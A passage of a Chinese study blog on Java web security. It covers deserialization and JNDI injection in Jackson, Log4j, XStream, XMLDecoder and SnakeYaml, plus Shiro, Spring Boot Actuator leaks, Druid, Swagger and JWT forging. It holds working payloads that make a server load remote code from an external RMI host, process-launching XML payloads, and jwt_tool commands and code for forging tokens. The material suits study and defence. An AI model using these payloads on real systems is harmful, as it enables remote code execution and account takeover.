+<p>payload例子：<code>[\&quot;com.nqadmin.rowset.JdbcRowSetImpl\&quot;,&#123;\&quot;dataSourceName\&quot;:\&quot;rmi://81.71.103.144:1099/jkv4dp&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot;&#125;]</code>（原理：当 Jackson 库反序列化这段代码时，会根据类信息创建一个 JdbcRowSetImpl 对象，并调用它的 setDataSourceName 方法，将 dataSourceName 属性赋值为 rmi:&#x2F;&#x2F;81.71.103.144:1099&#x2F;jkv4dp。然后，Jackson 库会调用它的 setAutoCommit 方法，将 autoCommit 属性赋值为 true。这时，JdbcRowSetImpl 对象会尝试连接 dataSourceName 指向的 RMI 服务，并执行其中的远程命令或加载其中的远程类）</p>
+<h3 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h3><p>Java安全框架，能够用于身份验证、授权、加密和会话管理。</p>
+<p>历史漏洞：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/search?q=Shiro">https://avd.aliyun.com/search?q=Shiro</a></p>
+<p>漏洞原理：Shiro框架在使用rememberMe（记住密码）功能时，对用户的cookie值进行序列化、AES加密和Base64编码，AES加密的密钥在源码中，导致攻击者可以构造恶意的序列化对象，绕过身份验证或执行远程代码。Shiro在接收到cookie值后，会进行Base64解码、AES解密和反序列化，如果反序列化的对象中包含恶意的代码，就会触发漏洞</p>
+<ul>
+<li>如何判断是不是shiro：</li>
+</ul>
+<p>在登录框输完账号密码，选择记住密码，提交后的数据包的cookie里有remember me字段就是shiro </p>
+<p>利用方法：</p>
+<p>直接利用工具：输入url-&gt;爆破密匙-&gt;检测密匙-&gt;爆破利用链-&gt;检测利用链</p>
+<h3 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h3><p>Apache的一个开源项目，是一个基于Java的日志记录框架。</p>
+<p>历史漏洞：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/search?q=Log4j">https://avd.aliyun.com/search?q=Log4j</a></p>
+<p>漏洞原理：一旦在log字符串中检测到${}，就会解析其中的字符串尝试使用lookup查询，因此只要能控制log参数内容，就有机会实现漏洞利用。</p>
+<p>不安全代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class Log4jVul &#123;</span><br><span class="line">    private static final Logger logger = LogManager.getLogger(Log4jVul.class);  //创建一个名为logger的Logger对象</span><br><span class="line">    @PostMapping(value = &quot;/vul&quot;)  //该方法将处理发送到&quot;/vul&quot;路径的POST请求</span><br><span class="line">    public String vul(@RequestParam(&quot;q&quot;) String q) &#123;  //接受一个名为&quot;q&quot;的请求参数，并将其值作为字符串传递给变量q</span><br><span class="line">        System.out.println(q);</span><br><span class="line">        logger.error(q);   //使用先前初始化的logger记录一个错误级别的日志，日志消息为接收到的参数值。</span><br><span class="line">        return &quot;Log4j2 JNDI Injection&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload例子：<code>$&#123;jndi:rmi://81.71.103.144:1099/jkv4dp&#125;</code></p>
+<h3 id="XStream"><a href="#XStream" class="headerlink" title="XStream"></a>XStream</h3><p>开源Java类库，能将对象序列化成XML或XML反序列化为对象</p>
+<p>历史漏洞：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/search?q=XStream">https://avd.aliyun.com/search?q=XStream</a></p>
+<p>漏洞原理：XStream在反序列化时，会根据XML数据中的类型信息创建新实例，并将XML数据转化为Java对象</p>
+<p>不安全代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public String vul(@RequestBody String content) &#123;</span><br><span class="line">    XStream xs = new XStream();  //这里创建了一个新的XStream对象。XStream是一个Java库，用于将对象序列化为XML（或从XML反序列化为对象）</span><br><span class="line">    xs.fromXML(content);  //使用XStream的fromXML方法来反序列化从请求中接收到的XML字符串（即content）到一个Java对象</span><br><span class="line">    return &quot;XStream Vul&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload例子：<code>&lt;sorted-set&gt;&lt;dynamic-proxy&gt;&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;&lt;handler class=&quot;java.beans.EventHandler&quot;&gt;&lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;command&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/command&gt;&lt;/target&gt;&lt;action&gt;start&lt;/action&gt;&lt;/handler&gt;&lt;/dynamic-proxy&gt;&lt;/sorted-set&gt;</code></p>
+<h3 id="真实项目审计"><a href="#真实项目审计" class="headerlink" title="真实项目审计"></a>真实项目审计</h3><p>一个仿天猫的网站</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/4.png" alt="4"></p>
+<p>fastjson</p>
+<p>全局搜索fastjson的函数<code>JSON.parseObject</code>或者<code>JSON.parse()</code></p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/5.png" alt="5"></p>
+<p>选择一个后面带可控参数的，这里都带了参数，那就随便选一个看可不可控</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/6.png" alt="6"></p>
+<p>追踪下这个参数哪里来的</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/7.png" alt="7"></p>
+<p>是admin&#x2F;product页面接收过来的参数，再在pom.xml里看看fastjson的版本，发现是1.2.58，去漏洞库查看发现存在漏洞，可以利用了</p>
+<p>去admin&#x2F;product页面，各种参数的地方全部随便填，抓包看看是哪里是那个参数</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/7-1706000722224-5.png" alt="7"></p>
+<p>只要把这个参数值修改成fastjson攻击代码就可以了</p>
+<p>log4j</p>
+<p>全局搜索fastjson的函数<code>JSON.parseObject</code>或<code>logger.error</code></p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/8.png" alt="8"></p>
+<p>前面几个都没有参数，第四个有参数，但是跟进后发现是从session中获取的，不一定可控，所以选第七个</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/10.png" alt="10"></p>
+<p>getOriginalFilename()是获取文件名的函数，根据注释或者路径中文意思可知，这是在管理员更换头像时，头像图片名存在log4j漏洞，看log4j版本，是2.10.0存在漏洞。</p>
+<p>我们直接访问这个路径，发现访问不了，因为这个路径只支持post提交，我们就直接到管理员改头像的地方</p>
+<h2 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h2><p>序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程。</p>
+<p>java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB。</p>
+<p>JAVA常见的序列化和反序列化的方法有JAVA 原生序列化和JSON 类（fastjson、jackson）序列化。JSON类看上面的内容，他的利用和原生序列化不一样</p>
+<p>原生序列化类函数：</p>
+<p>-ObjectInputStream.readObject()</p>
+<p>-XMLDecoder</p>
+<p>-SnakeYaml</p>
+<h3 id="readObject"><a href="#readObject" class="headerlink" title="readObject()"></a>readObject()</h3><p>这个的原理在安全开发javaee里面就学习过了，是重写方法</p>
+<p>他的漏洞利用可以用yakit里的yso-java hack</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/11.png" alt="11"></p>
+<p>这边有个利用链的选择，要选择这个项目里面外部库引用的链</p>
+<h3 id="XMLDecoder"><a href="#XMLDecoder" class="headerlink" title="XMLDecoder"></a>XMLDecoder</h3><p>他的代码是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BufferedInputStream bis = new BufferedInputStream(fis);</span><br><span class="line">XMLDecoder xmlDecoder = new XMLDecoder(bis);</span><br><span class="line">xmlDecoder.readObject();</span><br><span class="line">xmlDecoder.close();</span><br></pre></td></tr></table></figure>
+
+<p>所以其实他也是readObject()</p>
+<p>payload例子：<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;java version=&quot;1.8.0_151&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;cmd&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;/c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot; /&gt;&lt;/object&gt;&lt;/java&gt;</code></p>
+<h3 id="SnakeYaml"><a href="#SnakeYaml" class="headerlink" title="SnakeYaml"></a>SnakeYaml</h3><p>漏洞原理：SnakeYaml在反序列化时，会调用Java 类对象。那么攻击者可以通过构造恶意的字符串，执行任意代码（看payload的原理）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public void vul(String content) &#123;</span><br><span class="line">    Yaml y = new Yaml();  //创建了一个新的Yaml对象实例</span><br><span class="line">    y.load(content);  //使用之前创建的对象y来反序列化content</span><br><span class="line">    log.info(&quot;[vul] SnakeYaml反序列化: &quot; + content);  //显示反序列化结果</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload例子：<code>!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&#39;rmi://81.71.103.144:1099/jkv4dp&#39;]]]]</code>（原理：构造了一个包含javax.script.ScriptEngineManager类型的YAML数据。在反序列化时，SnakeYaml会尝试创建一个ScriptEngineManager对象，并调用其默认构造函数。然后，它会调用对象的setter方法，传入一个包含恶意代码的URLClassLoader对象。该恶意代码将尝试从rmi:&#x2F;&#x2F;81.71.103.144:1099&#x2F;jkv4dp下载并执行恶意的Java代码。）</p>
+<h3 id="SpringBoot框架"><a href="#SpringBoot框架" class="headerlink" title="SpringBoot框架"></a>SpringBoot框架</h3><p>SpringBoot Actuator模块提供了生产级别的功能，比如健康检查，审计，指标收集，HTTP跟踪等，帮助我们监控和管理Spring Boot应用。</p>
+<h4 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><ul>
+<li>人工：</li>
+</ul>
+<p>图标长这样：</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/18.png" alt="18"></p>
+<p>页面特征长这样：</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/19.png" alt="19"></p>
+<ul>
+<li>BP插件：</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/API-Security/APIKit">https://github.com/API-Security/APIKit</a></p>
+<p>开代理访问网站，这个插件会自动检测是否存在springboot漏洞。</p>
+<ul>
+<li>白盒：</li>
+</ul>
+<p>pom.xml,引用库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line"></span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class="line"></span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="泄漏安全"><a href="#泄漏安全" class="headerlink" title="泄漏安全"></a>泄漏安全</h4><p>（配置密码，AK&#x2F;SK等）</p>
+<p>在url后面加上<code>/actuators/env</code>，可以看到信息泄露</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/12.png" alt="12"></p>
+<p>但是这里的密码被保护起来了，想要知道需要访问<code>/actuators/heapdump</code>，下载heapdump文件，用以下两个工具进行分析</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/whwlsfb/JDumpSpider%EF%BC%88%E8%87%AA%E5%8A%A8%E5%8C%96%EF%BC%8C%E4%BD%86%E6%98%AF%E4%B8%9C%E8%A5%BF%E4%B9%B1%EF%BC%89">https://github.com/whwlsfb/JDumpSpider（自动化，但是东西乱）</a></p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/13.png" alt="13"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wyzxxz/heapdump_tool%EF%BC%88%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9F%A5%E6%89%BE%E6%B3%84%E9%9C%B2%E4%BB%80%E4%B9%88%EF%BC%89">https://github.com/wyzxxz/heapdump_tool（可以自定义查找泄露什么）</a> </p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/13-1706090586723-13.png" alt="13"></p>
+<h4 id="漏洞安全"><a href="#漏洞安全" class="headerlink" title="漏洞安全"></a>漏洞安全</h4><p>（利用类，CVE漏洞等）</p>
+<p>这个像上面那两个工具，可以二选一用，这里的两个工具攻击的原理不同，第一个攻击的是springboot自身的漏洞，第二个是通过springboot的信息泄露，利用代码本身可以被调用的对象来攻击。所以在下面看到同一个网站，第一个没用检测到漏洞，第二个检测到了 </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/AabyssZG/SpringBoot-Scan%EF%BC%88%E7%8B%90%E7%8B%B8%E5%B7%A5%E5%85%B7%E7%AE%B1%E9%87%8C%E4%B9%9F%E6%9C%89%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%9A%84%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%B8%8D%E8%BF%87%E6%B2%A1%E7%94%A8%E8%BF%99%E4%B8%AA%E5%A5%BD%E7%94%A8%EF%BC%89">https://github.com/AabyssZG/SpringBoot-Scan（狐狸工具箱里也有图形化的这个工具，不过没用这个好用）</a></p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/14.png" alt="14"></p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/17.png" alt="17"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></p>
+<p>这个是图形化工具</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/15.png" alt="15"></p>
+<p>这里服务器地址是127.0.0.1，我们要先在本地打开jndi注入的那个工具（注意这个springboot工具版本是1.3的，那jndi注入工具也要用1.3的</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/16.png" alt="16"></p>
+<h2 id="Druid监控"><a href="#Druid监控" class="headerlink" title="Druid监控"></a>Druid监控</h2><p>Druid是阿里巴巴数据库事业部出品，为监控而生的数据库连接池。Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控。当开发者配置不当时就可能造成未授权访问漏洞。</p>
+<ul>
+<li>判断方法：</li>
+</ul>
+<p>黑盒：拼接url（+&#x2F;druid）</p>
+<p>白盒：代码搜索druid</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/18-1706246055557-3.png" alt="18"></p>
+<ul>
+<li>攻击利用：</li>
+</ul>
+<p>1、直接拼接URL路径，尝试能否直接未授权访问系统功能点。</p>
+<p>2、结合泄露URL路径和Session信息，利用BurpSuite进行尝试登录。</p>
+<p>3、利用Cookie编辑器替换Session，再次访问后台路径尝试进入后台。</p>
+<p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1260382">https://developer.aliyun.com/article/1260382</a></p>
+<h2 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h2><p>Swagger是一个用于生成、描述和调用RESTful接口的Web服务。就是将项目中所有（想要暴露的）接口展现在页面上，并可以进行接口调用和测试的服务</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/19-1706246603134-5.png" alt="19"></p>
+<p>由于接口太多，一个个接口测试的话太费时间，所以一般会采用postman来自动化接口漏洞安全测试。</p>
+<p>APIS-&gt;Import-&gt;Link，注意这里的url要用页面左上角那个url，那个url才能得到所有接口</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/20.png" alt="20"></p>
+<p>在collections里可以看到他整理了所有接口，点击集合名字，在authorization里可以选择授权方式，因为可能这是需要登入的后台，我们需要给他身份验证的方式，不然未授权进来这个页面，全是500错误。然后点击右边的run，勾一下save response，再run一下。发现报错，是url多了两杠</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/21.png" alt="21"></p>
+<p>这时候再点一下collections-&gt;variables-&gt;initial value和current value的两条杠删了，保存下，在run一下就好了（如果varianles里只有一条斜杠，那就把他改成ip:port，不要www&#x2F;&#x2F;之类的） </p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/22.png" alt="22"></p>
+<p>我们还能联动BurpSuite Xray来自动化测试，postman-&gt;三横杠-&gt;file-&gt;settings-&gt;proxy，来设和bp一样的端口，burp-&gt;proxy settings-&gt;network-&gt;connctions-&gt;upstream proxy servers</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/23.png" alt="23"></p>
+<p>xray命令<code>xray.exe webscan --listen 127.0.0.1:7777 -html-output proxy.html</code></p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/24.png" alt="24"></p>
+<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>JSON Web Token(JWT)。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。</p>
+<h3 id="JWT特征"><a href="#JWT特征" class="headerlink" title="JWT特征"></a>JWT特征</h3><p>被两个<code>.</code>分成三部分，第一个是header（头部），第二个是payload（有效载荷），第三个是signature（签名），其中header和payload都是eyj打头</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/25.png" alt="25"></p>
+<ul>
+<li>标头（Header）</li>
+</ul>
+<p>Header是JWT的第一个部分，是一个JSON对象，主要声明了JWT的签名算法，如”HS256”、”RS256”等，以及其他可选参数，如”kid”、”jku”、”x5u”等</p>
+<p>alg字段通常用于表示加密采用的算法。如”HS256”、”RS256”等</p>
+<p><strong>hs（对称加密）：统一密匙解密，可以通过爆破得出密匙</strong></p>
+<p><strong>rs（非对称加密）：私钥解密，公钥加密，无法通过爆破得出密匙，因为爆破出来的是公钥，无法爆破出私钥</strong></p>
+<p>typ字段通常用于表示类型</p>
+<p>还有一些其他可选参数，如”kid”、”jku”、”x5u”等</p>
+<ul>
+<li>有效载荷（Payload）</li>
+</ul>
+<p>Payload是JWT的第二个部分，这是一个JSON对象，主要承载了各种声明并传递明文数据，用于存储用户的信息，如id、用户名、角色、令牌生成时间和其他自定义声明。</p>
+<p>iss：该字段表示jwt的签发者。</p>
+<p>sub：该jwt面向的用户。</p>
+<p>aud：jwt的接收方。</p>
+<p>exp：jwt的过期时间,通常来说是一个时间戳。</p>
+<p>iat：jwt的签发时间,常来说是一个时间戳。</p>
+<p>jti：此jwt的唯一标识。通常用于解决请求中的重放攻击。该字段在大多数地方没有被提及或使用。因为使用此字段就意味着必须要在服务器维护一张jti表， 当客户端携带jwt访问的时候需要在jti表中查找这个唯一标识是否被使用过。</p>
+<ul>
+<li>签名（Signature）</li>
+</ul>
+<p>Signature 部分是对前两部分的签名，防止数据篡改。<br>首先，需要指定一个密钥(secret)。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法(默认是 HMAC SHA256)，按照下面的公式产生签名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>拼接</li>
+</ul>
+<p>第一部分：对 JSON 的头部做 base64 编码处理得到</p>
+<p>第二部分：对 JSON 类型的 payload 做 base64 编码处理得到</p>
+<p>第三部分：分别对头部和载荷做base64编码，并使用.拼接起来</p>
+<p>使用头部声明的加密方式，对base64编码前两部分合并的结果加盐加密处理，作为JWT</p>
+<h3 id="JWT识别"><a href="#JWT识别" class="headerlink" title="JWT识别"></a>JWT识别</h3><ul>
+<li><p>人工：看上面的jwt特征</p>
+</li>
+<li><p>工具：burp插件hae（识别），在线网站<a target="_blank" rel="noopener" href="https://jwt.io/%E3%80%81">https://jwt.io/、</a> burp插件JSON Web Tokens（解密）</p>
+</li>
+</ul>
+<h3 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h3><ul>
+<li>解密jwt后，alg为None（空加密）：</li>
+</ul>
+<p>直接base64解码，修改paylaod里要修改的地方，base64编码后就能使用了</p>
+<ul>
+<li>解密jwt后，alg不为None，为hs：</li>
+</ul>
+<ol>
+<li><p>使用jwt_tool交互式修改JWT的值，<code>python3 jwt_tool.py JWT值 -T</code>，把alg改成none。将结果的第二个<code>.</code>后删了（因为空加密就不存在签名部分），就能使用（原理：JWT库通常会提供一个验证令牌的方法，同时提供对其解码的方法。例如，对于Node.js库jsonwebtoken来说，这两个方法分别是verify()和decode()。但有时开发人员会混淆这两个方法，只把传入的令牌传给decode()方法。这实际上意味着应用程序根本就没有验证签名。）</p>
+</li>
+<li><p>我们不知道密匙，直接修改payload来使用是无效的，可以使用jwt_tool爆破密匙，就是爆破这一个</p>
+<p><img src="/2024/01/20/JAVA%E5%AE%89%E5%85%A8/26.png" alt="26"></p>
+<p><code>python3 jwt_tool.py JWT值 -C -d dictionary.txt</code>，使用密匙就能直接在那个在线网站上面改也可也用那个工具交互式修改</p>
+</li>
+</ol>
+<ul>
+<li>解密jwt后，alg不为None，为rs：</li>
+</ul>
+<ol>
+<li><p>公钥私钥泄露：利用源码泄露等漏洞，获得公钥，用python代码，给payload加密：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line">public = open(&#x27;public.key&#x27;, &#x27;r&#x27;).read()</span><br><span class="line">payload=&#123;&quot;user&quot;:&quot;admin&quot;&#125;</span><br><span class="line">print(jwt.encode(payload, key=public, algorithm=&#x27;RS256&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>（这个库比较特殊，要安装jwt和pyjwt）</p>
+</li>
+<li><p>密钥混淆攻击：比如一个jwt是rs256加密，且已知了解密的私钥。我们可以把他当作以私钥为密匙的hs256加密，加密代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var jwt = require(&#x27;jsonwebtoken&#x27;);</span><br><span class="line">var fs = require(&#x27;fs&#x27;);</span><br><span class="line"></span><br><span class="line">var privateKey = fs.readFileSync(&#x27;./private.key&#x27;);</span><br><span class="line">var token = jwt.sign(&#123; user: &#x27;admin&#x27; &#125;, privateKey, &#123; algorithm: &#x27;HS256&#x27; &#125;);</span><br><span class="line">console.log(token)</span><br></pre></td></tr></table></figure>
+
+<p>原理：因为我们要的是能被私钥那一串数字256解密的就行，我们就可以把他看成以那串私钥为密匙，hs256加密后的内容，一定可以被那串私钥为密匙的256解密</p>
+</li>
+</ol>
+<ul>
+<li>头部参数注入、其他漏洞和一些靶场攻击，看<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44288604/article/details/128562796">https://blog.csdn.net/weixin_44288604/article/details/128562796</a></li>
+</ul>
+<h3 id="黑盒JWT测试"><a href="#黑盒JWT测试" class="headerlink" title="黑盒JWT测试"></a>黑盒JWT测试</h3><p>首先找到需要JWT鉴权后才能访问的页面，如个人资料页面，将该请求包重放测试：</p>
+<p>1）未授权访问：删除Token后仍然可以正常响应对应页面</p>
+<p>2）敏感信息泄露：通过JWt.io解密出Payload后查看其中是否包含敏感信息，如弱加密的密码等</p>
+<p>3）破解密钥+越权访问：通过JWT.io解密出Payload部分内容，通过空加密算法或密钥爆破等方式实现重新签发Token并修改Payload部分内容，重放请求包，观察响应包是否能够越权查看其他用户资料</p>
+<p>4）检查Token时效性：解密查看payload中是否有exp字段键值对（Token过期时间），等待过期时间后再次使用该Token发送请求，若正常响应则存在Token不过期</p>
+<p>5）通过页面回显进行探测：如修改Payload中键值对后页面报错信息是否存在注入，payload中kid字段的目录遍历问题与sql注入问题</p>
+<h1 id="面试问不回显常见判断方法"><a href="#面试问不回显常见判断方法" class="headerlink" title="面试问不回显常见判断方法"></a>面试问不回显常见判断方法</h1><p>知道具体的怎么办就具体回答，不知道就说下面三个：</p>
+<p>1、直接将执行结果写入到静态资源文件里，如html、js等，然后访问。</p>
+<p>2、通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了。</p>
+<p>3、接将命令执行结果回显到数据包中。</p>
+
+                </section>
+
+                
+                
+
+                
+
+            </article>
+
+            
+            <nav class="dis_flex al_post_nav">
+                <a class="al_post_nav_item dis_flex_acenter" href="/">
+                    
+                </a>
+                <a class="al_post_nav_item dis_flex_acenter" href="/2023/11/29/APP%E6%94%BB%E9%98%B2/">
+                    
+                        <span class="al_text_ellipsis al_post_nav_desc">APP攻防</span>
+                        <svg class="al_arrow">
+                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-right"></use>
+                        </svg>
+                    
+                </a>
+            </nav>
+        </div>
+    </div>
+
+
+        <div class="al_index_footer dis_flex_center">
+    <div class="al_index_footer_item al_index_footer_title">
+        John Doe
+    </div>
+
+    
+    
+
+    <div class="al_index_footer_item al_index_footer_extra">
+        Created By 
+        <a target="_blank" rel="noopener" href="https://github.com/iGuan7u/Acetolog">AcetoLog</a>
+         · Power By 
+        <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
+    </div>
+
+    <div class="al_index_footer_item al_index_footer_extra_right">
+        All Right Reserved
+    </div>
+</div>
+
+        <script type="text/javascript" async="async" src="/javascripts/acelog.js"></script>
+        
+        
+        
+        
+        
+
+    </body>
+</html>
